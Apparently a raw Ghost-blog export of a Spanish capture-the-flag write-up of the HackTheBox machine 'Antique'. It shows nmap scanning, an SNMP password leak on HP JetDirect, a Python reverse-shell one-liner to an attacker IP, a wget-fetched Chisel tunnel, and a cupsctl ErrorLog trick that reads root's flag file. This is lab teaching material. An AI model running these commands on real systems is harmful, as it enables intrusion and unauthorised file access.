ErrorLog=\\\"/root/root.txt\\\"\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2022/01/Screenshot_3-1.png\",\"width\":560,\"height\":153}]],\"markups\":[[\"a\",[\"href\",\"https://app.hackthebox.com/\"]],[\"em\"],[\"a\",[\"href\",\"https://www.exploit-db.com/exploits/22319\"]],[\"a\",[\"href\",\"https://es.wikipedia.org/wiki/Common_Unix_Printing_System\"]],[\"a\",[\"href\",\"https://pentestwiki.org/pivoting/\"]],[\"a\",[\"href\",\"https://github.com/jpillora/chisel\"]],[\"a\",[\"href\",\"https://www.rapid7.com/db/modules/post/multi/escalate/cups_root_file_read/\"]],[\"a\",[\"href\",\"https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"Me estreno con este post donde me pongo en la piel de un pentester o Hacker (que mola más) y trato de conseguir acceso a una de las máquinas de \"],[0,[0],1,\"HackTheBox\"],[0,[],0,\". Este tipo de pruebas se denominan Capture The Flag, que básicamente consiste en:\"]]],[3,\"ol\",[[[0,[],0,\"Comprometer la máquina y conseguir acceso a ella.\"]],[[0,[],0,\"Escalar privilegios de root y obtener el flag final, que consiste en un hash (una cadena de caracteres).\"]]]],[1,\"p\",[[0,[],0,\"De este modo, introduces el flag en la plataforma y demuestras que has conseguido el reto.\"]]],[1,\"p\",[[0,[],0,\"En cualquier caso, vamos al lío. Las fases de un trabajo de este tipo son las siguientes:\"]]],[10,0],[1,\"p\",[[0,[],0,\"Si bien es cierto que no es un trabajo totalmente lineal y que en cada uno de los momentos debes continuar enumerando dispositivos, analizando vulnerabilidades nuevas que te vas encontrando... podemos resumirlo del siguiente modo:\"]]],[3,\"ol\",[[[0,[],0,\"Escaneo\"]],[[0,[],0,\"Acceso al sistema\"]],[[0,[],0,\"Escalado de privilegios\"]]]],[1,\"h2\",[[0,[],0,\"1. Escaneo\"]]],[1,\"p\",[[0,[],0,\"Este es el punto más automático de todos. En todas las máquinas tienes que seguir la misma metodología y tratar de enumerar el máximo número de puertos abiertos en la máquina que deseas atacar.\"]]],[10,1],[1,\"p\",[[0,[1],1,\"donde:\"]]],[3,\"ul\",[[[0,[1],1,\"-p- lista los puertos de [0, 65535]\"]],[[0,[1],1,\"-sT se centra en los de protocolo TCP\"]],[[0,[1],1,\"--open filtra por puertos abiertos\"]],[[0,[1],1,\"--min-rate 5000 fija el uso mínimo de 5000 paquetes/s para aumentar la velocidad\"]],[[0,[1],1,\"-vvv nos devuelve información de los puertos según los va descubriendo\"]],[[0,[1],1,\"-n deshabilita la resolución DNS para hacerlo más rápido\"]],[[0,[1],1,\"-Pn trata todos los hosts online, deshabilitando el host discovery\"]],[[0,[1],1,\"-oG exporta en formato grep la respuesta del comando a un archivo\"]]]],[1,\"p\",[[0,[],0,\"El comando nos arroja el puerto 23 abierto. Lanzamos otro comando más específico a ver si podemos sacar alguna conclusión más próxima de que tenemos delante.\"]]],[10,2],[1,\"p\",[[0,[1],1,\"donde\"]]],[3,\"ul\",[[[0,[1],1,\"-p23 especifica el puerto que se desea atacar\"]],[[0,[1],1,\"-sCV utiliza los scripts básicos de reconocimiento para tratar de recuperar la versión del servicio en escucha además de otra información básica\"]],[[0,[1],1,\"-vvv devuelve información importante\"]],[[0,[1],1,\"-oN exporta en formato de NMAP la respuesta del comando a un archivo\"]]]],[1,\"p\",[[0,[],0,\"Visualizamos la respuesta y analizamos. En este caso la herramienta no ha sido capaz de recuperar que servicio está corriendo detrás del puerto, pero nos arroja cierta información que ha recuperado.\"]]],[10,3],[1,\"p\",[[0,[],0,\"Vamos a conectarnos directamente nosotros al puerto 23 mediante telnet a ver que nos encontramos.\"]]],[10,4],[1,\"p\",[[0,[],0,\"Parece que hay un servicio de gestión de impresoras HP respondiendo, pero no desconocemos la contraseña. Navegando por internet, hayamos el siguiente \"],[0,[2],1,\"post \"],[0,[],0,\"donde explican algunos problemas con este servicio. Lanzamos el siguiente comando y tratamos de ver la respuesta.\"]]],[10,5],[1,\"p\",[[0,[],0,\"La vulnerabilidad habla de una revelación de la contraseña de acceso en formato hexadecimal, por lo que vamos a empezar por copiar toda la cadena de caracteres después de \\\"BITS:\\\" y decodificarlo a un formato que podamos leer mejor.\"]]],[10,6],[1,\"p\",[[0,[],0,\"Vaya, vamos a probar \"],[0,[1],1,\"P@ssw0rd@123!!123 \"],[0,[],0,\"y ver que pasa.\"]]],[10,7],[1,\"p\",[[0,[],0,\"Probando distintos datos de entrada, parece que podemos llegar a ejecutar código remotamente. Llegamos incluso a ver que el propio servicio de HP JetDirect es un script de Python por lo que podemos inferir que la máquina es capaz de ejecutar este tipo de archivos.\"]]],[1,\"h2\",[[0,[],0,\"2. Acceso al sistema\"]]],[1,\"p\",[[0,[],0,\"Ponemos en nuestra máquina un servicio escuchando en el puerto 443 y lanzamos desde la consola de Telnet el siguiente script\"]]],[10,8],[1,\"p\",[[0,[],0,\"Volvemos a nuestra consola donde estábamos esperando la shell...\"]]],[10,9],[1,\"p\",[[0,[],0,\"Primera flag obtenida. Estamos dentro.\"]]],[1,\"h2\",[[0,[],0,\"3. Escalado de privilegios\"]]],[1,\"p\",[[0,[],0,\"Llegados a este punto, continuamos viendo que puertos hay abiertos en el sistema.\"]]],[10,10],[1,\"p\",[[0,[],0,\"Si hacemos curl al puerto 631 desde la máquina atacada vemos una web de \"],[0,[3],1,\"CUPS \"],[0,[],0,\"que no es accesible desde nuestro sistema, por lo que no podemos ver nada desde nuestra máquina.\"]]],[1,\"p\",[[0,[],0,\"Para trabajar un poco más cómodos, es necesario hacer \"],[0,[4],1,\"pivoting\"],[0,[],0,\". Personalmente, me gusta utilizar ssh para crear un túnel, pero en este caso no tenemos acceso por ssh ni podemos conseguirlo ejecutando un ssh-keygen al no estar instalado en el sistema atacado.\"]]],[1,\"p\",[[0,[],0,\"Existe una herramienta denominada \"],[0,[5],1,\"Chisel \"],[0,[],0,\"que nos permite conseguir lo mismo sin necesitar permisos de root ni de nada.\"]]],[1,\"p\",[[0,[],0,\"Procedemos a compilarla en nuestra máquina y lanzamos el servidor en modo reverse, para dejarle al cliente escoger el puerto desde el cual quiere crear el túnel.\"]]],[10,11],[1,\"p\",[[0,[],0,\"Una vez hecho esto, procedemos a enviar el binario a la máquina atacada con el fin de poder ejecutarlo también. Levantamos un servidor en el puerto 8080 con Python.\"]]],[10,12],[1,\"p\",[[0,[],0,\"Y en el servidor remoto, nos lo descargamos con wget y le damos permisos de ejecución para conectarnos al otro extremo.\"]]],[10,13],[1,\"p\",[[0,[],0,\"Abrimos un navegador desde nuestro sistema et voilà.\"]]],[10,14],[1,\"p\",[[0,[],0,\"Lo siguiente que podemos hacer es buscar vulnerabilidades para la versión 1.6.1 de CUPS. Y nos encontramos ante la siguiente \"],[0,[6],1,\"vulnerabilidad\"],[0,[],0,\" y el siguiente \"],[0,[7],1,\"exploit\"],[0,[],0,\". Es un post de un script de Metasploit que en principio lo vamos a utilizar para entender que hace. Generalmente, estos scripts hacen tareas muy simples y es interesante examinarlos para aprender más aún de ellos. En este caso, la vulnerabilidad se basa en un problema dentro del módulo de administración>ver archivo de registro de error en CUPS. \"]]],[1,\"p\",[[0,[],0,\"Este módulo imprime por pantalla la ubicación del log de error. Además, aquellos usuarios del grupo \"],[0,[1],1,\"lpadmin \"],[0,[],0,\"son capaces de modificar dicha ubicación con el comando \"],[0,[1],1,\"cupsctl\"],[0,[],0,\". Comprobamos que pertenecemos a dicho grupo.\"]]],[10,15],[1,\"p\",[[0,[],0,\"Y procedemos a modificar la ruta a la que queremos acceder con el siguiente comando.\"]]],[10,16],[1,\"p\",[[0,[],0,\"Nos aseguramos que seguimos manteniendo el túnel de Chisel activo y vamos al navegador para revisar el módulo de error de CUPS.\"]]],[10,17],[1,\"p\",[[0,[],0,\"Ahí está el flag de root. He tenido que recargar la página asegurándome de no cachear la respuesta, ya que al principio no era capaz de ver el resultado. Con esto finalizamos la máquina.\"]]],[1,\"h2\",[[0,[],0,\"Conclusión\"]]],[1,\"p\",[[0,[],0,\"Esta máquina se nota que es de dificultad fácil aunque no es trivial el escalado de privilegios final si no has trabajado antes con impresoras en Linux. Ha sido necesario investigar el funcionamiento de los scripts de Metasploit para no alargar mucho la resolución de la misma y aunque finalmente solo tienes acceso a leer archivos de la máquina y no es un escalado de privilegios real, podemos darla por terminada.\"]]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>Me estreno con este post donde me pongo en la piel de un pentester o Hacker (que mola más) y trato de conseguir acceso a una de las máquinas de <a href=\"https://app.hackthebox.com/\">HackTheBox</a>. Este tipo de pruebas se denominan Capture The Flag, que básicamente consiste en:</p><ol><li>Comprometer la máquina y conseguir acceso a ella.</li><li>Escalar privilegios de root y obtener el flag final, que consiste en un hash (una cadena de caracteres).</li></ol><p>De este modo, introduces el flag en la plataforma y demuestras que has conseguido el reto.</p><p>En cualquier caso, vamos al lío. Las fases de un trabajo de este tipo son las siguientes:</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/01/fases-proyecto-pentesting-768x478.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"768\" height=\"478\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/01/fases-proyecto-pentesting-768x478.png 600w, __GHOST_URL__/content/images/2022/01/fases-proyecto-pentesting-768x478.png 768w\" sizes=\"(min-width: 720px) 720px\"></figure><p>Si bien es cierto que no es un trabajo totalmente lineal y que en cada uno de los momentos debes continuar enumerando dispositivos, analizando vulnerabilidades nuevas que te vas encontrando... podemos resumirlo del siguiente modo:</p><ol><li>Escaneo</li><li>Acceso al sistema</li><li>Escalado de privilegios</li></ol><h2 id=\"1-escaneo\">1. Escaneo</h2><p>Este es el punto más automático de todos. En todas las máquinas tienes que seguir la misma metodología y tratar de enumerar el máximo número de puertos abiertos en la máquina que deseas atacar.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-bash\">❯ nmap -p- -sT --open --min-rate 5000 -vvv -n -Pn -oG allPorts antique.htb</code></pre><figcaption>NMAP all ports discovery</figcaption></figure><p><em>donde:</em></p><ul><li><em>-p- lista los puertos de [0, 65535]</em></li><li><em>-sT se centra en los de protocolo TCP</em></li><li><em>--open filtra por puertos abiertos</em></li><li><em>--min-rate 5000 fija el uso mínimo de 5000 paquetes/s para aumentar la velocidad</em></li><li><em>-vvv nos devuelve información de los puertos según los va descubriendo</em></li><li><em>-n deshabilita la resolución DNS para hacerlo más rápido</em></li><li><em>-Pn trata todos los hosts online, deshabilitando el host discovery</em></li><li><em>-oG exporta en formato grep la respuesta del comando a un archivo</em></li></ul><p>El comando nos arroja el puerto 23 abierto. Lanzamos otro comando más específico a ver si podemos sacar alguna conclusión más próxima de que tenemos delante.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-bash\">❯ nmap -p23 -sCV -vvv -oN targeted antique.htb</code></pre><figcaption>NMAP specific port service version discovery</figcaption></figure><p><em>donde</em></p><ul><li><em>-p23 especifica el puerto que se desea atacar</em></li><li><em>-sCV utiliza los scripts básicos de reconocimiento para tratar de recuperar la versión del servicio en escucha además de otra información básica</em></li><li><em>-vvv devuelve información importante</em></li><li><em>-oN exporta en formato de NMAP la respuesta del comando a un archivo</em></li></ul><p>Visualizamos la respuesta y analizamos. En este caso la herramienta no ha sido capaz de recuperar que servicio está corriendo detrás del puerto, pero nos arroja cierta información que ha recuperado.</p><pre><code class=\"language-bash\">PORT   STATE SERVICE REASON         VERSION\n23/tcp open  telnet? syn-ack ttl 63\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port23-TCP:V=7.92%I=7%D=1/30%Time=61F672BE%P=x86_64-pc-linux-gnu%r(NULL\nSF:,F,\"\\nHP\\x20JetDirect\\n\\n\")%r(GenericLines,19,\"\\nHP\\x20JetDirect\\n\\nPas\nSF:sword:\\x20\")%r(tn3270,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(GetReq\nSF:uest,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(HTTPOptions,19,\"\\nHP\\x2\nSF:0JetDirect\\n\\nPassword:\\x20\")%r(RTSPRequest,19,\"\\nHP\\x20JetDirect\\n\\nPa\nSF:ssword:\\x20\")%r(RPCCheck,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(DNS\nSF:VersionBindReqTCP,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(DNSStatusR\nSF:equestTCP,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(Help,19,\"\\nHP\\x20J\nSF:etDirect\\n\\nPassword:\\x20\")%r(SSLSessionReq,19,\"\\nHP\\x20JetDirect\\n\\nPa\nSF:ssword:\\x20\")%r(TerminalServerCookie,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\nSF:\\x20\")%r(TLSSessionReq,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(Kerbe\nSF:ros,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(SMBProgNeg,19,\"\\nHP\\x20J\nSF:etDirect\\n\\nPassword:\\x20\")%r(X11Probe,19,\"\\nHP\\x20JetDirect\\n\\nPasswor\nSF:d:\\x20\")%r(FourOhFourRequest,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r\nSF:(LPDString,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(LDAPSearchReq,19,\nSF:\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(LDAPBindReq,19,\"\\nHP\\x20JetDire\nSF:ct\\n\\nPassword:\\x20\")%r(SIPOptions,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x\nSF:20\")%r(LANDesk-RC,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(TerminalSe\nSF:rver,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(NCP,19,\"\\nHP\\x20JetDire\nSF:ct\\n\\nPassword:\\x20\")%r(NotesRPC,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\nSF:\")%r(JavaRMI,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(WMSRequest,19,\"\nSF:\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(oracle-tns,19,\"\\nHP\\x20JetDirect\nSF:\\n\\nPassword:\\x20\")%r(ms-sql-s,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")\nSF:%r(afp,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(giop,19,\"\\nHP\\x20JetD\nSF:irect\\n\\nPassword:\\x20\");\n</code></pre><p>Vamos a conectarnos directamente nosotros al puerto 23 mediante telnet a ver que nos encontramos.</p><pre><code class=\"language-bash\">❯ telnet antique.htb\nTrying 10.10.11.107...\nConnected to antique.htb.\nEscape character is '^]'.\n\nHP JetDirect\n\nPassword: 1234\nInvalid password\nConnection closed by foreign host.</code></pre><p>Parece que hay un servicio de gestión de impresoras HP respondiendo, pero no desconocemos la contraseña. Navegando por internet, hayamos el siguiente <a href=\"https://www.exploit-db.com/exploits/22319\">post </a>donde explican algunos problemas con este servicio. Lanzamos el siguiente comando y tratamos de ver la respuesta.</p><pre><code class=\"language-bash\">❯ snmpwalk -v 2c -c public antique.htb .1.3.6.1.4.1.11.2.3.9.1.1.13.0\niso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 \n33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135</code></pre><p>La vulnerabilidad habla de una revelación de la contraseña de acceso en formato hexadecimal, por lo que vamos a empezar por copiar toda la cadena de caracteres después de \"BITS:\" y decodificarlo a un formato que podamos leer mejor.</p><pre><code class=\"language-bash\">❯ echo \"50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 \\106 111 114 115 119 122 123 126 130 131 134 135\" | xxd -r -p\n# P@ssw0rd@123!!123�q��\"2Rbs3CSs��$4�Eu�WGW�(8i\tIY�aA�\"1&amp;1A5# </code></pre><p>Vaya, vamos a probar <em>P@ssw0rd@123!!123 </em>y ver que pasa.</p><pre><code class=\"language-bash\">❯ telnet antique.htb\nTrying 10.10.11.107...\nConnected to antique.htb.\nEscape character is '^]'.\nHP JetDirect\n\nPassword: P@ssw0rd@123!!123\n\nPlease type \"?\" for HELP\n&gt; </code></pre><p>Probando distintos datos de entrada, parece que podemos llegar a ejecutar código remotamente. Llegamos incluso a ver que el propio servicio de HP JetDirect es un script de Python por lo que podemos inferir que la máquina es capaz de ejecutar este tipo de archivos.</p><h2 id=\"2-acceso-al-sistema\">2. Acceso al sistema</h2><p>Ponemos en nuestra máquina un servicio escuchando en el puerto 443 y lanzamos desde la consola de Telnet el siguiente script</p><pre><code class=\"language-python\">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.16\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'</code></pre><p>Volvemos a nuestra consola donde estábamos esperando la shell...</p><pre><code class=\"language-sh\">❯ nc -lvp 443\nlistening on [any] 443 ...\nconnect to [10.10.14.16] from antique.htb [10.10.11.107] 37726\nlp@antique:~$ whoami\nlp\nlp@antique:~$ hostname -I\n10.10.11.107 \nlp@antique:~$ cat user.txt\t\n7d28xxxxxxxxxxxxxxxxxxxxx</code></pre><p>Primera flag obtenida. Estamos dentro.</p><h2 id=\"3-escalado-de-privilegios\">3. Escalado de privilegios</h2><p>Llegados a este punto, continuamos viendo que puertos hay abiertos en el sistema.</p><pre><code class=\"language-sh\">lp@antique:~$ ss -tulpn | grep LISTEN\ntcp     LISTEN   0        4096             0.0.0.0:631           0.0.0.0:*\ntcp     LISTEN   0        128              0.0.0.0:23            0.0.0.0:* users:((\"python3\",pid=828,fd=3))\ntcp     LISTEN   0        4096                [::]:631              [::]:*</code></pre><p>Si hacemos curl al puerto 631 desde la máquina atacada vemos una web de <a href=\"https://es.wikipedia.org/wiki/Common_Unix_Printing_System\">CUPS </a>que no es accesible desde nuestro sistema, por lo que no podemos ver nada desde nuestra máquina.</p><p>Para trabajar un poco más cómodos, es necesario hacer <a href=\"https://pentestwiki.org/pivoting/\">pivoting</a>. Personalmente, me gusta utilizar ssh para crear un túnel, pero en este caso no tenemos acceso por ssh ni podemos conseguirlo ejecutando un ssh-keygen al no estar instalado en el sistema atacado.</p><p>Existe una herramienta denominada <a href=\"https://github.com/jpillora/chisel\">Chisel </a>que nos permite conseguir lo mismo sin necesitar permisos de root ni de nada.</p><p>Procedemos a compilarla en nuestra máquina y lanzamos el servidor en modo reverse, para dejarle al cliente escoger el puerto desde el cual quiere crear el túnel.</p><pre><code class=\"language-bash-l-root\">❯ git clone https://github.com/jpillora/chisel\n❯ cd chisel &amp;&amp; go build -ldflags=\"-s -w\"\n❯ sudo ./chisel server -p 8000 --reverse</code></pre><p>Una vez hecho esto, procedemos a enviar el binario a la máquina atacada con el fin de poder ejecutarlo también. Levantamos un servidor en el puerto 8080 con Python.</p><pre><code class=\"language-sh\">❯ python3 -m http.server 8080\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...</code></pre><p>Y en el servidor remoto, nos lo descargamos con wget y le damos permisos de ejecución para conectarnos al otro extremo.</p><pre><code class=\"language-sh\">lp@antique:~$ wget 10.10.14.16:8080/chisel\n...\nchisel              100%[===================&gt;]   7.75M  5.53MB/s    in 1.4s\n2022-01-30 12:52:20 (5.53 MB/s) - ‘chisel’ saved [8130560/8130560]\nlp@antique:~$ chmod +x chisel\nlp@antique:~$ ./chisel client 10.10.14.16:8000 R:631:127.0.0.1:631\n./chisel client 10.10.14.16:8000 R:631:127.0.0.1:631\n2022/01/30 12:55:03 client: Connecting to ws://10.10.14.16:8000\n2022/01/30 12:55:03 client: Connected (Latency 43.929004ms)</code></pre><p>Abrimos un navegador desde nuestro sistema et voilà.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/01/Screenshot_2.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"643\" height=\"507\" srcset=\"__GHOST_URL__/content/images/size/w600/2022/01/Screenshot_2.png 600w, __GHOST_URL__/content/images/2022/01/Screenshot_2.png 643w\"></figure><p>Lo siguiente que podemos hacer es buscar vulnerabilidades para la versión 1.6.1 de CUPS. Y nos encontramos ante la siguiente <a href=\"https://www.rapid7.com/db/modules/post/multi/escalate/cups_root_file_read/\">vulnerabilidad</a> y el siguiente <a href=\"https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read\">exploit</a>. Es un post de un script de Metasploit que en principio lo vamos a utilizar para entender que hace. Generalmente, estos scripts hacen tareas muy simples y es interesante examinarlos para aprender más aún de ellos. En este caso, la vulnerabilidad se basa en un problema dentro del módulo de administración&gt;ver archivo de registro de error en CUPS. </p><p>Este módulo imprime por pantalla la ubicación del log de error. Además, aquellos usuarios del grupo <em>lpadmin </em>son capaces de modificar dicha ubicación con el comando <em>cupsctl</em>. Comprobamos que pertenecemos a dicho grupo.</p><pre><code class=\"language-sh\">lp@antique:~$ id\nuid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)</code></pre><p>Y procedemos a modificar la ruta a la que queremos acceder con el siguiente comando.</p><pre><code class=\"language-bash\">lp@antique:~$ cupsctl ErrorLog=\"/root/root.txt\"</code></pre><p>Nos aseguramos que seguimos manteniendo el túnel de Chisel activo y vamos al navegador para revisar el módulo de error de CUPS.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2022/01/Screenshot_3-1.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"560\" height=\"153\"></figure><p>Ahí está el flag de root. He tenido que recargar la página asegurándome de no cachear la respuesta, ya que al principio no era capaz de ver el resultado. Con esto finalizamos la máquina.</p><h2 id=\"conclusi%C3%B3n\">Conclusión</h2><p>Esta máquina se nota que es de dificultad fácil aunque no es trivial el escalado de privilegios final si no has trabajado antes con impresoras en Linux. Ha sido necesario investigar el funcionamiento de los scripts de Metasploit para no alargar mucho la resolución de la misma y aunque finalmente solo tienes acceso a leer archivos de la máquina y no es un escalado de privilegios real, podemos darla por terminada.</p>",
            "comment_id": "61f5d8426ac095014c9c3d9d",
            "plaintext": "Me estreno con este post donde me pongo en la piel de un pentester o Hacker (que mola más) y trato de conseguir acceso a una de las máquinas de HackTheBox. Este tipo de pruebas se denominan Capture The Flag, que básicamente consiste en:\n\n 1. Comprometer la máquina y conseguir acceso a ella.\n 2. Escalar privilegios de root y obtener el flag final, que consiste en un hash (una cadena de caracteres).\n\nDe este modo, introduces el flag en la plataforma y demuestras que has conseguido el reto.\n\nEn cualquier caso, vamos al lío. Las fases de un trabajo de este tipo son las siguientes:\n\nSi bien es cierto que no es un trabajo totalmente lineal y que en cada uno de los momentos debes continuar enumerando dispositivos, analizando vulnerabilidades nuevas que te vas encontrando... podemos resumirlo del siguiente modo:\n\n 1. Escaneo\n 2. Acceso al sistema\n 3. Escalado de privilegios\n\n\n1. Escaneo\n\nEste es el punto más automático de todos. En todas las máquinas tienes que seguir la misma metodología y tratar de enumerar el máximo número de puertos abiertos en la máquina que deseas atacar.\n\n❯ nmap -p- -sT --open --min-rate 5000 -vvv -n -Pn -oG allPorts antique.htb\n\ndonde:\n\n * -p- lista los puertos de [0, 65535]\n * -sT se centra en los de protocolo TCP\n * --open filtra por puertos abiertos\n * --min-rate 5000 fija el uso mínimo de 5000 paquetes/s para aumentar la velocidad\n * -vvv nos devuelve información de los puertos según los va descubriendo\n * -n deshabilita la resolución DNS para hacerlo más rápido\n * -Pn trata todos los hosts online, deshabilitando el host discovery\n * -oG exporta en formato grep la respuesta del comando a un archivo\n\nEl comando nos arroja el puerto 23 abierto. Lanzamos otro comando más específico a ver si podemos sacar alguna conclusión más próxima de que tenemos delante.\n\n❯ nmap -p23 -sCV -vvv -oN targeted antique.htb\n\ndonde\n\n * -p23 especifica el puerto que se desea atacar\n * -sCV utiliza los scripts básicos de reconocimiento para tratar de recuperar la versión del servicio en escucha además de otra información básica\n * -vvv devuelve información importante\n * -oN exporta en formato de NMAP la respuesta del comando a un archivo\n\nVisualizamos la respuesta y analizamos. En este caso la herramienta no ha sido capaz de recuperar que servicio está corriendo detrás del puerto, pero nos arroja cierta información que ha recuperado.\n\nPORT   STATE SERVICE REASON         VERSION\n23/tcp open  telnet? syn-ack ttl 63\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port23-TCP:V=7.92%I=7%D=1/30%Time=61F672BE%P=x86_64-pc-linux-gnu%r(NULL\nSF:,F,\"\\nHP\\x20JetDirect\\n\\n\")%r(GenericLines,19,\"\\nHP\\x20JetDirect\\n\\nPas\nSF:sword:\\x20\")%r(tn3270,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(GetReq\nSF:uest,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(HTTPOptions,19,\"\\nHP\\x2\nSF:0JetDirect\\n\\nPassword:\\x20\")%r(RTSPRequest,19,\"\\nHP\\x20JetDirect\\n\\nPa\nSF:ssword:\\x20\")%r(RPCCheck,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(DNS\nSF:VersionBindReqTCP,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(DNSStatusR\nSF:equestTCP,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(Help,19,\"\\nHP\\x20J\nSF:etDirect\\n\\nPassword:\\x20\")%r(SSLSessionReq,19,\"\\nHP\\x20JetDirect\\n\\nPa\nSF:ssword:\\x20\")%r(TerminalServerCookie,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\nSF:\\x20\")%r(TLSSessionReq,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(Kerbe\nSF:ros,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(SMBProgNeg,19,\"\\nHP\\x20J\nSF:etDirect\\n\\nPassword:\\x20\")%r(X11Probe,19,\"\\nHP\\x20JetDirect\\n\\nPasswor\nSF:d:\\x20\")%r(FourOhFourRequest,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r\nSF:(LPDString,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(LDAPSearchReq,19,\nSF:\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(LDAPBindReq,19,\"\\nHP\\x20JetDire\nSF:ct\\n\\nPassword:\\x20\")%r(SIPOptions,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x\nSF:20\")%r(LANDesk-RC,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(TerminalSe\nSF:rver,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(NCP,19,\"\\nHP\\x20JetDire\nSF:ct\\n\\nPassword:\\x20\")%r(NotesRPC,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\nSF:\")%r(JavaRMI,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(WMSRequest,19,\"\nSF:\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(oracle-tns,19,\"\\nHP\\x20JetDirect\nSF:\\n\\nPassword:\\x20\")%r(ms-sql-s,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")\nSF:%r(afp,19,\"\\nHP\\x20JetDirect\\n\\nPassword:\\x20\")%r(giop,19,\"\\nHP\\x20JetD\nSF:irect\\n\\nPassword:\\x20\");\n\n\nVamos a conectarnos directamente nosotros al puerto 23 mediante telnet a ver que nos encontramos.\n\n❯ telnet antique.htb\nTrying 10.10.11.107...\nConnected to antique.htb.\nEscape character is '^]'.\n\nHP JetDirect\n\nPassword: 1234\nInvalid password\nConnection closed by foreign host.\n\nParece que hay un servicio de gestión de impresoras HP respondiendo, pero no desconocemos la contraseña. Navegando por internet, hayamos el siguiente post donde explican algunos problemas con este servicio. Lanzamos el siguiente comando y tratamos de ver la respuesta.\n\n❯ snmpwalk -v 2c -c public antique.htb .1.3.6.1.4.1.11.2.3.9.1.1.13.0\niso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 \n33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135\n\nLa vulnerabilidad habla de una revelación de la contraseña de acceso en formato hexadecimal, por lo que vamos a empezar por copiar toda la cadena de caracteres después de \"BITS:\" y decodificarlo a un formato que podamos leer mejor.\n\n❯ echo \"50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 \\106 111 114 115 119 122 123 126 130 131 134 135\" | xxd -r -p\n# 